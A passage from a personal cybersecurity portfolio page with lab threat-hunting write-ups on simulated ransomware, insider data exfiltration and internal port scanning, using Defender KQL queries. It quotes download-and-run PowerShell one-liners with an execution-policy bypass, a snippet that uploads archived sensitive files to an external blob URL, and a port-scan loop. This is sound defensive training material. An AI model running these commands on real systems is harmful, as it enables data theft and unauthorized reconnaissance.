| order by Timestamp desc
-------------------------------------------------------

Result: Two instances of PowerShell.exe were identified, both launched non-interactively with the parameters:

ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command "& {...}"

The initiator process was senseir.exe, a legitimate Windows background service that had been abused to execute PowerShell. This discovery confirmed that PowerShell was used to deploy or execute the encryption payload.

### D. Tracing Child Processes and Persistence Mechanisms

To verify what PowerShell spawned:

-------------------------------------------------------
kql
DeviceProcessEvents
| where DeviceName == VMName
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
-------------------------------------------------------

Result: PowerShell launched several cmd.exe and svchost.exe instances. These, in turn, executed processes such as python.exe, GameBarElevatedFT_Alias.exe, and MediaPlayer.exe, which were all generated within C:\Users\samson\AppData\Local\Temp â a common ransomware staging area.

### E. File Events Linked to User Folders

To focus on desktop encryption evidence:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName
| where Timestamp >= ago(24h)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FolderPath has_any("Desktop","\\Users\\")
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by Timestamp desc
-------------------------------------------------------

Result:

A file named __decryption-instructions.lnk appeared on the desktop immediately after hundreds of file renames and creations, confirming the delivery of the ransom note. The parent process was explorer.exe, which executed after system encryption had completed, a typical behaviour of ransomware scripts displaying ransom messages post-infection.

### F. Process Chain Correlation â Root Cause Determination

Finally, to reconstruct the infection path:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceProcessEvents
| where DeviceName == VMName
| where Timestamp between (ago(120m) .. now())
| where FileName in~ ("powershell.exe","cmd.exe","services.exe","svchost.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
| order by Timestamp asc
-------------------------------------------------------

Findings:

1. powershell.exe (initiated by senseir.exe) executed a hidden script with an AllSigned policy bypass.
2. This instance spawned cmd.exe, which registered background services.
3. services.exe then created multiple svchost.exe processes running under SYSTEM and Network Service accounts.
4. These service-hosted processes performed the encryption routines on user data.

<InlineGallery images={pwncrypt-ransomware-investigation} title="PwnCrypt Ransomware Investigation and Analysis Process" />

## Investigation Summary

The analysis confirmed that samson-windows- was infected with PwnCrypt ransomware delivered via a PowerShell payload. The encryption occurred under SYSTEM privileges, appending custom extensions to files and generating a ransom note on the desktop.

Execution Chain:
senseir.exe â powershell.exe â cmd.exe â services.exe â svchost.exe â file encryption (.pwncrypt)

## Response and Containment

1. Isolated the compromised VM from the network using Defender's Isolate Device function.
2. Conducted a full antivirus and Defender scan; confirmed malicious artifacts were limited to the VM.
3. Recommended a complete VM rebuild to remove any residual persistence.
4. Captured SHA-1 hashes of key malicious files (__decryption-instructions.lnk, encrypted files) for threat-intel reference.
5. Logged the incident for follow-up reporting to management and for potential YARA-rule creation.

## Documentation

Each phase of this investigation â preparation, data collection, analysis, and response â was recorded within Microsoft Defender's query history and screenshots for audit and learning purposes.

All queries were executed methodically to trace the incident from initial file-system anomalies to the responsible process hierarchy.

## MITRE ATT&CK Mapping

The PwnCrypt ransomware activity observed in samson-windows- aligns with several stages of the MITRE ATT&CK framework.

1. **Initial Access (T1204.002 â User Execution)**: Infection began through manual execution of a malicious PowerShell script.
2. **Execution (T1059.001 / T1059.003)**: PowerShell and CMD were used to run the payload and supporting commands.
3. **Persistence (T1543.003)**: New service-host processes were created to maintain execution.
4. **Privilege Escalation & Defense Evasion (T1569.002 / T1562.001 / T1036.005)**: Ransomware leveraged elevated service contexts, bypassed PowerShell policies, and masqueraded as legitimate Windows binaries.
5. **Discovery (T1082)**: Enumerated user directories such as C:\Users\samson\Desktop before encryption.
6. **Impact (T1486 / T1491.001)**: Encrypted user files with the .pwncrypt extension and dropped a ransom note (__decryption-instructions.lnk).

Overall, the attack followed a full ransomware kill chain â Execution â Persistence â Privilege Escalation â Defence Evasion â Impact â demonstrating how PowerShell abuse and service creation can rapidly lead to data encryption and ransom deployment.

## Improvement and Lessons Learned

1. **Restrict PowerShell usage**: Configure Constrained Language Mode and allow only signed scripts.
2. **Implement application whitelisting**: Block unauthorized interpreters (cmd.exe, powershell.exe, etc.) in user space.
3. **Monitor mass file modifications**: Create a detection rule for spikes in FileModified and FileRenamed actions per host.
4. **Enhance user awareness**: Ransomware often enters through phishing or drive-by downloads; continuous education is essential.
5. **Segment the network**: Prevent lateral propagation between machines by enforcing least-privilege access controls.

## Conclusion

The investigation conclusively determined that the observed encryption on samson-windows- was caused by the PwnCrypt ransomware, executed via a PowerShell-based payload with SYSTEM privileges.

Although contained within the lab environment, the event accurately simulated a real-world ransomware outbreak and demonstrated how rapid detection through telemetry correlation from file anomalies to process hierarchies enables timely containment.

Through disciplined analysis and structured response, this project reinforced the value of proactive threat-hunting practices using Microsoft Defender for Endpoint.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)
1b:T290f,
## Introduction

This threat-hunting exercise focused on investigating a suspected case of data exfiltration within a simulated enterprise environment. The scenario revolved around a disgruntled employee placed on a Performance Improvement Plan (PIP) who was suspected of archiving and leaking proprietary company data.

The purpose of this hunt was to determine whether the employee's device showed evidence of unauthorized data compression, archiving, or transmission activity. Using Microsoft Defender for Endpoint (MDE), I leveraged multiple telemetry tables and KQL-based threat-hunting techniques to uncover any trace of insider-driven data-exfiltration behavior.

My lab environment consisted of an onboarded Windows VM named samson-windows-, which reported telemetry to MDE in real time. This allowed me to simulate realistic user behavior, analyze relevant forensic artifacts, and document a structured end-to-end threat-hunting process.

## Scenario Overview

The investigation began when management raised a concern about John Doe, an employee in a sensitive department who had recently been placed on a PIP after a workplace altercation. Following the incident, leadership feared that John might attempt to steal sensitive data and resign.

John's workstation, samson-windows-, was configured with administrative privileges and unrestricted PowerShell access, an ideal setup for potential insider misuse. The working hypothesis was that John might have compressed critical data using utilities such as 7-Zip or WinRAR, then attempted to transfer those archives outside the corporate network.

The objective of this threat hunt was to analyze logs, identify any evidence of archiving behavior, and determine whether exfiltration attempts occurred.

## Preparation

Before the analysis, I ensured that the VM (samson-windows-) was successfully onboarded to MDE. Once active, I simulated malicious insider behavior by executing a PowerShell script that automated the compression and simulated upload of internal files. This helped generate realistic telemetry for review.

- Created VM and onboarded to Microsoft Defender for Endpoint
- RDP connection established to VM
- Downloaded and ran MDE onboarding package
- VM successfully reporting in Defender portal

### PowerShell Command

-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
-------------------------------------------------------

This command downloaded and executed the ExfiltrateData.ps1 script, which silently installed 7-Zip, created compressed archives of sample "employee data," and simulated uploading them to an external Azure storage bucket.

In an enterprise context, this type of activity would strongly suggest unauthorized data handling or insider exfiltration. Allowing the VM to run for several minutes ensured that sufficient telemetry was collected across all relevant MDE tables for subsequent analysis.

## Data Collection

With the environment set up, I verified that Defender for Endpoint was actively ingesting telemetry into the core tables:

- DeviceFileEvents
- DeviceProcessEvents
- DeviceNetworkEvents

I ran an initial query to confirm that new records were appearing in real time.

### KQL Check for Recent Logs

-------------------------------------------------------
kql
DeviceFileEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The query confirmed that logs were fresh and consistent, ensuring that the upcoming threat-hunting queries would analyze live data. In a production SOC, this mirrors the critical validation step before any deep-dive investigation: confirming log integrity and timeliness.

## Data Analysis

The next step was to search for file archiving activities, which could indicate data being staged for exfiltration. To achieve this, I filtered DeviceProcessEvents for any processes linked to known archiving applications such as 7-Zip, WinRAR, or Bandizip.

### KQL â Detect Archive Process Activity

-------------------------------------------------------
kql
let archive_applications = dynamic(["winrar.exe","7z.exe","winzip32.exe","peazip.exe","Bandizip.exe","UniExtract.exe","POWERARC.EXE","IZArc.exe","AshampooZIP.exe","FreeArc.exe"]);
let VMName = "samson-windows-";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc
-------------------------------------------------------

Within seconds, several 7-Zip executions were observed on samson-windows-, followed by the creation of a suspicious archive named employee_data.zip. The events revealed a sequence of file creations and renames inside C:\ProgramData\Backup\, suggesting automation.

Each entry was timestamped at predictable intervals, reinforcing the possibility of a scripted operation.

## Investigation

To understand the sequence of events more deeply, I pivoted to the DeviceProcessEvents table to identify which process spawned 7-Zip and to the DeviceFileEvents table to trace archive creation activity.

### KQL â Correlate File and Process Activity

-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-14T18:42:10.5615171Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

This query identified a PowerShell script named exfiltrate_data.ps1 executed under the System account, which silently installed 7-Zip and then created the archive. The log also showed a follow-up PowerShell command initiating a network connection immediately after compression, a strong indicator of data exfiltration.

Upon reviewing the VM's filesystem, I located the script at C:\ProgramData\exfiltratedata.ps1. Its content confirmed automated behavior: downloading, archiving, and attempting to upload files to an external endpoint.

<InlineGallery images={data-exfiltration-detection-analysis} title="Data Exfiltration Detection and Analysis Process" />

### Snippet of the Observed PowerShell Script

Simplified excerpt of ExfiltrateData.ps1

-------------------------------------------------------
powershell
Start-Process "7z.exe" -ArgumentList "a", "C:\ProgramData\Backup\employee_data.zip", "C:\SensitiveFiles*"
Invoke-WebRequest -Uri "https://storageaccount.blob.core.windows.net/container/employee_data.zip" -Method Put -InFile "C:\ProgramData\Backup\employee_data.zip"
-------------------------------------------------------

The script structure and timing aligned perfectly with the MDE logs, validating that a scripted 7-Zip operation had occurred. While no explicit network event confirmed the upload due to logging limitations, the sequence strongly suggested an attempted data transfer.

## Response and MITRE ATT&CK Mapping

This activity mapped directly to several tactics within the MITRE ATT&CK Framework:

1. **T1059.001 â PowerShell (Execution)**: PowerShell was used to install and execute the archiving utility.
2. **T1560 â Archive Collected Data (Collection)**: 7-Zip was used to compress sensitive data.
3. **T1074 â Data Staged (Collection)**: Archives were staged locally in C:\ProgramData\Backup\.
4. **T1048 â Exfiltration Over Alternative Protocol (Exfiltration)**: The script attempted HTTP PUT operations to Azure Blob storage.
5. **T1082 â System Information Discovery (Discovery)**: System metadata was queried before execution.

Upon discovering the activity, I isolated samson-windows- using Defender for Endpoint's "Isolate Device" feature to prevent further data loss. A subsequent malware scan returned no persistent threats; however, standard protocol would dictate re-imaging the endpoint for assurance.

## Documentation

Every step of this hunt should meticulously be documented from initial hypothesis through evidence gathering and correlation. All queries, findings, timestamps, and reasoning should be logged to ensure transparency and repeatability.

This approach mirrors a real-world SOC investigation, where maintaining a chronological record of queries and findings is crucial for post-incident reviews and audits. It also supports organizational learning by building an internal knowledge repository for future hunts.

## Improvement

Following the investigation, several security improvements were identified for the environment:

1. **Restrict PowerShell Execution Policies**: Limit execution to signed scripts only.
2. **Apply Data Loss Prevention (DLP) Controls**: Block unauthorized archive creation and outbound uploads.
3. **Enable Network Segmentation**: Prevent free east-west traffic between workstations.
4. **Implement Insider Threat Monitoring**: Establish alerts for mass file compressions or rapid archiving.
5. **Automate Detection Rules**: Create custom Defender queries to alert when users modify more than N ZIP files within a defined interval.

Together, these recommendations would help detect and contain future insider threat attempts before data is lost.

## Conclusion

This scenario successfully demonstrated how a disgruntled employee with admin rights could use simple PowerShell automation and compression tools to exfiltrate data without triggering traditional antivirus alerts.

Through structured querying in Microsoft Defender for Endpoint and methodical log analysis, I was able to trace the entire activity chain, from script execution to archiving and simulated upload attempts.

This exercise reinforced the importance of monitoring for non-malware abuse of legitimate tools and the necessity of tight endpoint controls to detect and deter insider threats in modern enterprise networks.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)
1c:T3430,
## Introduction

This threat hunting exercise was focused on investigating a sudden and unexplained network slowdown observed within a simulated enterprise lab environment. Using Microsoft Defender for Endpoint (MDE), the purpose of this hunt was to determine whether the performance degradation was caused by malicious internal activity, excessive resource usage, or misconfigured systems.

The environment consisted of my onboarded virtual machine named samson-windows-1, which was actively reporting telemetry to Microsoft Defender for Endpoint. The goal was to use real-time logs and threat hunting queries to identify abnormal behaviors that could suggest internal reconnaissance, port scanning, or other unauthorized actions within the network.

This scenario demonstrates a practical application of endpoint detection and response (EDR) data in uncovering internal security issues and applying structured analysis techniques to isolate potential causes.

## Scenario Overview

The issue began when the server team observed an overall slowdown across multiple legacy devices in the 10.0.0.0/16 subnet. External DDoS attacks were ruled out, meaning the cause was likely internal. The unrestricted internal network environment, where all hosts could communicate freely and PowerShell was allowed without restriction, created a perfect scenario for internal misuse or exploitation.

The working hypothesis for this hunt was that one of the systems inside the local network could have been performing unauthorized port scanning or large data transfers, which would naturally create latency or bandwidth congestion. The objective was to identify the specific device responsible for this unusual activity and determine whether it was a deliberate or automated action.

## Preparation

Before starting the hunt, I ensured that my virtual machine, samson-windows-, was properly onboarded to Microsoft Defender for Endpoint. Once confirmed, I simulated an internal event by executing a PowerShell command designed to initiate a controlled port scan within the local subnet. This step was necessary to generate realistic logs for analysis, mimicking what a real-world internal threat might look like.

<InlineGallery images={vm-setup-onboarding} title="VM Setup and Microsoft Defender Onboarding Process" />

### PowerShell Command
-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
-------------------------------------------------------

This PowerShell command downloaded and executed a script that scanned a range of IPs within the 10.0.0.x subnet, sequentially probing ports on other devices. In a real enterprise setting, this would represent a potential reconnaissance operation, something commonly done by attackers or misconfigured tools trying to map network exposure.

After executing the command, I allowed several minutes for the resulting logs to populate in Microsoft Defender for Endpoint's hunting tables. The preparation phase was crucial, as it ensured that the system had generated enough telemetry to analyze behaviors such as failed connection attempts, sequential port scanning, and process execution traces.

## Data Collection

Once the environment was prepared, the next phase involved verifying that telemetry data was actively being received across the three key Defender tables: DeviceNetworkEvents, DeviceFileEvents, and DeviceProcessEvents.

I began by executing a simple query to confirm that new logs were flowing in correctly. By ordering results by timestamp and taking the most recent entries, I could confirm that MDE was actively collecting data and that there were no ingestion delays.

### KQL Check for Recent Network Logs
-------------------------------------------------------
kql
DeviceNetworkEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The timestamps confirmed that logs were being generated in real time. Having verified the data sources, I was confident that the environment was providing the necessary visibility to conduct meaningful analysis.

In a real security operations environment, this phase mimics ensuring that sensors and logging mechanisms are functioning correctly before an investigation begins. Without fresh telemetry, an analyst could end up drawing conclusions from outdated or incomplete information.

## Data Analysis

The analysis phase began with looking for signs of network anomalies, specifically focusing on connection attempts that had either failed or succeeded in large quantities. A sudden burst of such activity could be indicative of scanning or enumeration attempts within the network.

### KQL â Count Failed Connections
-------------------------------------------------------
kql
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by FailedConnectionsAttempts desc
-------------------------------------------------------

When the results came back, the data immediately pointed to samson-windows- as the primary contributor to abnormal connection failures. The logs revealed that the device had failed over a hundred connection attempts, some directed at its own IP address and others toward another host in the subnet. Such behavior was a strong indicator of either misconfiguration or automated probing.

To further understand the scope of the activity, I drilled down into specific IP addresses that exhibited the highest failure rates. This approach mirrors a real-world scenario where analysts pivot from a general pattern to a specific anomaly for deeper inspection.

### KQL â Inspect All Failed Connections from a Specific IP
-------------------------------------------------------
kql
let IPInQuestion = "10.0.0.5";
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == IPInQuestion
| order by Timestamp desc
-------------------------------------------------------

Upon reviewing the sequence of failed connection attempts, it became clear that the remote ports being contacted followed a sequential pattern: ports 21, 23, 25, 53, 80, 110, 443, and others. This pattern matched the signature of a port scanning activity, which is typically used to identify open services running across hosts. Sequential probing of well-known ports is rarely accidental and often indicates reconnaissance or mapping behavior within the network.

At this stage, I had high confidence that the slowdown was caused by internal scanning originating from the samson-windows- VM.

<InlineGallery images={network-investigation-analysis} title="Network Investigation and Analysis Process" />

## Investigation

To confirm the origin of this suspicious activity, I pivoted to the DeviceProcessEvents table to look for the process responsible for initiating these connections. By focusing on a specific time window surrounding the detected network anomalies, I aimed to identify any executable or script that matched the port scanning behavior.

### KQL â Correlate Process Activity around the Port Scan Time
-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-12T13:15:03.9576325Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

The query output revealed that a PowerShell script named portscan.ps1 had been executed under the System account. This was a significant finding because the System account generally has administrative-level privileges and is not typically used to execute network scanning scripts.

Upon logging into the VM, I located the file in C:\ProgramData\portscan.ps1 and reviewed its contents. The script was intentionally scanning hosts in the subnet, sequentially testing common ports. This confirmed that the slowdown was caused by repeated internal scanning initiated by the PowerShell script.

### Snippet of the observed PowerShell script:
-------------------------------------------------------
powershell
for ($i=4; $i -le 10; $i++) {
   Test-NetConnection "10.0.0.$i" -Port 21,23,25,53,80,110,443
}
-------------------------------------------------------

Since the script was running under the System account and not triggered by an identifiable user, I concluded that the activity was automated and potentially malicious. I proceeded to isolate the samson-windows- VM from the network using Defender for Endpoint's built-in Isolate Device feature.

After isolating the system, I ran a full malware scan to check for persistence mechanisms or additional payloads. The scan returned clean, but ideally you are to request a full rebuild of the VM. In a production setting, this step ensures that any potential hidden or dormant artifacts are fully removed.

<InlineGallery images={port-scan-investigation-isolation} title="Port Scan Investigation and Device Isolation Process" />

## Response and MITRE ATT&CK Mapping

This scenario corresponded with several techniques in the MITRE ATT&CK Framework, helping align the observed activity with recognized adversarial tactics:

1. **Reconnaissance (T1046 â Network Service Scanning)**: The port scanning activity represented a clear attempt to enumerate open services.
2. **Execution (T1059.001 â PowerShell)**: The PowerShell script was used as the execution medium for network probing.
3. **Privilege Escalation (T1078 â Valid Accounts / System Context)**: The script ran under the System account, suggesting a high privilege level.
4. **Lateral Movement (T1021 â Remote Services)**: The scanning pattern indicated attempts to discover reachable hosts for potential lateral movement.

By isolating the device, scanning for malware, and scheduling a reimage, the risk of any further impact was neutralized.

## Documentation

Throughout the course of this investigation, I documented every major step and observation to ensure a clear understanding of how the event unfolded. The investigation began with an initial hypothesis of possible internal misuse, which evolved into the discovery of systematic port scanning. Each query used in Defender for Endpoint was recorded alongside its findings to form an evidence trail.

This documentation not only captured the technical steps taken, such as verifying logs, pivoting between tables, and confirming the script execution but also reflected the reasoning behind each action. Maintaining detailed documentation like this allows for transparency, consistency, and reproducibility in future hunts. It also helps build reference material that can be used by other analysts for similar incidents, ensuring the organization's knowledge base grows with every investigation.

## Improvement

After analyzing the entire scenario, several improvement points were identified. First, it became clear that PowerShell execution policies were too relaxed in this environment. Restricting PowerShell to only run signed scripts would immediately reduce the risk of arbitrary script execution.

Second, the internal network lacked segmentation, allowing one compromised host to communicate freely with all others. In a real corporate setup, proper network segmentation would ensure that unnecessary east-west traffic is limited and monitored.

Third, implementing automated alerting for abnormal internal traffic patterns, such as repeated connection failures to sequential ports, would enable the SOC team to detect similar behavior earlier. Additionally, conducting proactive threat hunts on a routine basis helps catch reconnaissance activities before they evolve into actual compromise events.

Ultimately, this scenario reinforced the importance of combining technical detection with procedural discipline, ensuring every hunt improves the overall security posture of the environment.

## Conclusion

The sudden network slowdown was traced to a PowerShell-based port scanning script executed under the System account on samson-windows-. Although no active compromise was found, the activity realistically simulated how internal reconnaissance could degrade performance and increase exposure within an unrestricted network.

This hunt demonstrated the power of Microsoft Defender for Endpoint in identifying behavioral anomalies, correlating telemetry across different data sources, and facilitating immediate containment actions.

Through structured investigation and methodical documentation, this exercise emphasized how internal misconfigurations or unauthorized automation can lead to observable network symptoms, and how disciplined threat hunting can quickly uncover their root cause.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)

9:["$","$L12",null,{"projectData":{"slug":"building-full-hardware-cybersecurity-homelab","title":"Building a Full Hardware Cybersecurity Home Lab","description":"A comprehensive guide on transitioning from VirtualBox to building a fully equipped hardware cybersecurity home lab, complete with network design, hardware choices, and virtual machine configurations.","date":"2025-05-15","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"Infrastructure","tags":["Home Lab","Hardware","Networking","Infrastructure","Virtualization"],"content":"$13","image":"/images/projects/project 4.jpg","technologies":[],"images":[{"src":"/images/projects/hardware-lab/1-router.jpg","alt":"Router Configuration - Initial Setup"},{"src":"/images/projects/hardware-lab/2-router.jpg","alt":"Router Configuration - Network Settings"},{"src":"/images/projects/hardware-lab/3-router.jpg","alt":"Router Configuration - Final Setup"},{"src":"/images/projects/hardware-lab/4-switch.jpg","alt":"Switch Installation - Hardware View"},{"src":"/images/projects/hardware-lab/5-switch.jpg","alt":"Switch Configuration - Port Setup"},{"src":"/images/projects/hardware-lab/6-server.jpg","alt":"Server Hardware - Front View"},{"src":"/images/projects/hardware-lab/7-server.jpg","alt":"Server Hardware - Internal Components"},{"src":"/images/projects/hardware-lab/8-devices-connection.png","alt":"Network Devices Connection Diagram"},{"src":"/images/projects/hardware-lab/9-connection.jpg","alt":"Physical Network Connections - Setup 1"},{"src":"/images/projects/hardware-lab/10-connection.jpg","alt":"Physical Network Connections - Setup 2"},{"src":"/images/projects/hardware-lab/11-connection.jpg","alt":"Physical Network Connections - Setup 3"},{"src":"/images/projects/hardware-lab/12-connection.jpg","alt":"Physical Network Connections - Setup 4"},{"src":"/images/projects/hardware-lab/13-setup.jpg","alt":"Complete Lab Setup - View 1"},{"src":"/images/projects/hardware-lab/14-setup.jpg","alt":"Complete Lab Setup - View 2"},{"src":"/images/projects/hardware-lab/15-proxmox.png","alt":"Proxmox VE - Installation"},{"src":"/images/projects/hardware-lab/16-proxmox.png","alt":"Proxmox VE - Configuration"},{"src":"/images/projects/hardware-lab/17-proxmox.png","alt":"Proxmox VE - VM Setup"},{"src":"/images/projects/hardware-lab/18-proxmox.png","alt":"Proxmox VE - Network Configuration"},{"src":"/images/projects/hardware-lab/19-OPNSense.png","alt":"OPNSense Firewall Dashboard"},{"src":"/images/projects/hardware-lab/20-switch.png","alt":"Switch Management Interface"}],"series":{"name":"Project 4: Building a Full Hardware Cybersecurity Home Lab","part":1,"totalParts":1}},"relatedProjects":[{"slug":"upgrade-1-4tb-sata-hard-drive-proxmox","title":"Upgrade 1: Installing a 4TB SATA Hard Drive in My Proxmox Server","description":"A detailed walkthrough of expanding Proxmox VE storage with a 4TB SATA drive, including troubleshooting detection issues and proper system integration.","date":"2025-07-18","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"Infrastructure","tags":["Proxmox","Storage","Hardware","SATA","Linux","System Administration","Troubleshooting","Infrastructure","Homelab"],"content":"$14","image":"/images/projects/hardware-lab/20250712_133828.jpg","technologies":[],"images":[{"src":"/images/projects/hardware-lab/20250712_133903.jpg","alt":"4TB SATA hard drive installation process"},{"src":"/images/projects/hardware-lab/20250712_133922.jpg","alt":"Hardware connection verification"},{"src":"/images/projects/hardware-lab/20250712_141335.jpg","alt":"System detection troubleshooting"},{"src":"/images/projects/hardware-lab/20250712_133957.jpg","alt":"Drive mounting and configuration"},{"src":"/images/projects/hardware-lab/20250712_141450.jpg","alt":"Final system integration"},{"src":"/images/projects/hardware-lab/New 4 TB HArd drive.png","alt":"New 4TB hard drive overview"}],"series":{"name":"Upgrade 1: Installing a 4TB SATA Hard Drive in My Proxmox Server","part":1,"totalParts":1}},{"slug":"vlans-segmentation-homelab","title":"Segmenting My Cybersecurity Homelab Using VLANs","description":"A detailed walkthrough of implementing VLAN segmentation in my cybersecurity homelab using OPNsense, Cisco switches, and Proxmox for better traffic control and security isolation.","date":"2025-06-29","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"Infrastructure","tags":["VLAN","Network Segmentation","OPNsense","Cisco Switch","Proxmox","Infrastructure","Homelab"],"content":"$15","image":"/images/projects/hardware-lab/home-lab-image.jpeg","technologies":[],"images":[{"src":"/images/projects/hardware-lab/Homelab Project V117.png","alt":"Homelab Project V117 Overview"},{"src":"/images/projects/hardware-lab/Navigating to VLAN Management and VLAN Setting in Cisco Switch.png","alt":"Navigating to VLAN Management and VLAN Setting in Cisco Switch"},{"src":"/images/projects/hardware-lab/Adding new VLAN rule in cisco switch.png","alt":"Adding new VLAN rule in cisco switch"},{"src":"/images/projects/hardware-lab/Trying to set up Port VLAN Membership.png","alt":"Trying to set up Port VLAN Membership"},{"src":"/images/projects/hardware-lab/Assigning Trunk and access VLANs to Infrastructure and physical ports or system.png","alt":"Assigning Trunk and access VLANs to Infrastructure and physical ports or system"},{"src":"/images/projects/hardware-lab/Setting PVID Primary VLAN ID of Physical Parrot OS and Windows OS to ensure Untagged traffic is treated as part of that VLAN.png","alt":"Setting PVID Primary VLAN ID of Physical Parrot OS and Windows OS to ensure Untagged traffic is treated as part of that VLAN"},{"src":"/images/projects/hardware-lab/Navigating to create VLAN Interface on OPNSense.png","alt":"Navigating to create VLAN Interface on OPNSense"},{"src":"/images/projects/hardware-lab/Creating VLAN Interface on OPNSense.png","alt":"Creating VLAN Interface on OPNSense"},{"src":"/images/projects/hardware-lab/Assigning Interface on OPNSense.png","alt":"Assigning Interface on OPNSense"},{"src":"/images/projects/hardware-lab/Interface Assigned on OPNSense firewall.png","alt":"Interface Assigned on OPNSense firewall"},{"src":"/images/projects/hardware-lab/chatgpt.png","alt":"ChatGPT assistance"},{"src":"/images/projects/hardware-lab/Setting up Static IPs and DHCP For all Interface.png","alt":"Setting up Static IPs and DHCP For all Interface"},{"src":"/images/projects/hardware-lab/Enabling DHCP Server for static IP.png","alt":"Enabling DHCP Server for static IP"},{"src":"/images/projects/hardware-lab/DHCP Set for all Static IPs.png","alt":"DHCP Set for all Static IPs"},{"src":"/images/projects/hardware-lab/Creating Firewall rules for Each Interface.png","alt":"Creating Firewall rules for Each Interface"},{"src":"/images/projects/hardware-lab/Adding Firewall rules for first Interface.png","alt":"Adding Firewall rules for first Interface"},{"src":"/images/projects/hardware-lab/Firewall rules Added for all Interface.png","alt":"Firewall rules Added for all Interface"},{"src":"/images/projects/hardware-lab/Creating new linux bridge.png","alt":"Creating new linux bridge"},{"src":"/images/projects/hardware-lab/Configuring VLAN In Proxmox to Make it VLAN Aware.png","alt":"Configuring VLAN In Proxmox to Make it VLAN Aware"},{"src":"/images/projects/hardware-lab/Configuring VM interface with VLAN Tags on Proxmox.png","alt":"Configuring VM interface with VLAN Tags on Proxmox"},{"src":"/images/projects/hardware-lab/Kali on proxmox now having internet.png","alt":"Kali on proxmox now having internet"},{"src":"/images/projects/hardware-lab/Windows 10 on proxmox having internet access.png","alt":"Windows 10 on proxmox having internet access"},{"src":"/images/projects/hardware-lab/running ip show link on proxmox to know how to go about creating linux bridge.png","alt":"Running ip show link on proxmox to know how to go about creating linux bridge"},{"src":"/images/projects/hardware-lab/CHATGPTSHELL.png","alt":"ChatGPT shell assistance"}],"series":{"name":"Project 4.1: VLANs Segmentation In My Homelab","part":1,"totalParts":1}},{"slug":"building-cybersecurity-home-lab-part2","title":"Part 2: Generating Telemetry and Analyzing Attacks","description":"Generating telemetry and analyzing attacks in our cybersecurity home lab.","date":"2024-11-23","author":"Samson Otori","client":"Personal Project","challenge":"Generate and analyze telemetry data to detect malicious activities.","solution":"Used Nmap for reconnaissance, Metasploit for attack simulation, and Splunk for log analysis.","results":["Successfully generated attack telemetry","Implemented attack detection capabilities","Gained hands-on experience with security tools"],"category":"blue","tags":["Blue Team","Home Lab","SIEM"],"content":"$16","image":"/images/projects/Project 1.png","technologies":["Nmap","Metasploit","Python","Splunk"],"images":[{"src":"/images/projects/homelab-part2/1 RDP Port Opened on windows 10 NMAP SCAN.png","alt":"RDP Port Opened on Windows 10 - NMAP Scan"},{"src":"/images/projects/homelab-part2/2 MSFVEnoM.png","alt":"MSFVenom Configuration"},{"src":"/images/projects/homelab-part2/3 msfvenom payload i will use.png","alt":"MSFVenom Payload Selection"},{"src":"/images/projects/homelab-part2/4 Malware Creation RESUME.png","alt":"Malware Creation Process"},{"src":"/images/projects/homelab-part2/5 msfconsole.png","alt":"MSFConsole Interface"},{"src":"/images/projects/homelab-part2/6 payload options .png","alt":"Payload Options Configuration"},{"src":"/images/projects/homelab-part2/7 Changing the payload options.png","alt":"Modifying Payload Options"},{"src":"/images/projects/homelab-part2/8 Settings LHOST to Attacker IP.png","alt":"Setting LHOST to Attacker IP"},{"src":"/images/projects/homelab-part2/9 Listening and waiting for test machine to execute malware.png","alt":"Listener Waiting for Test 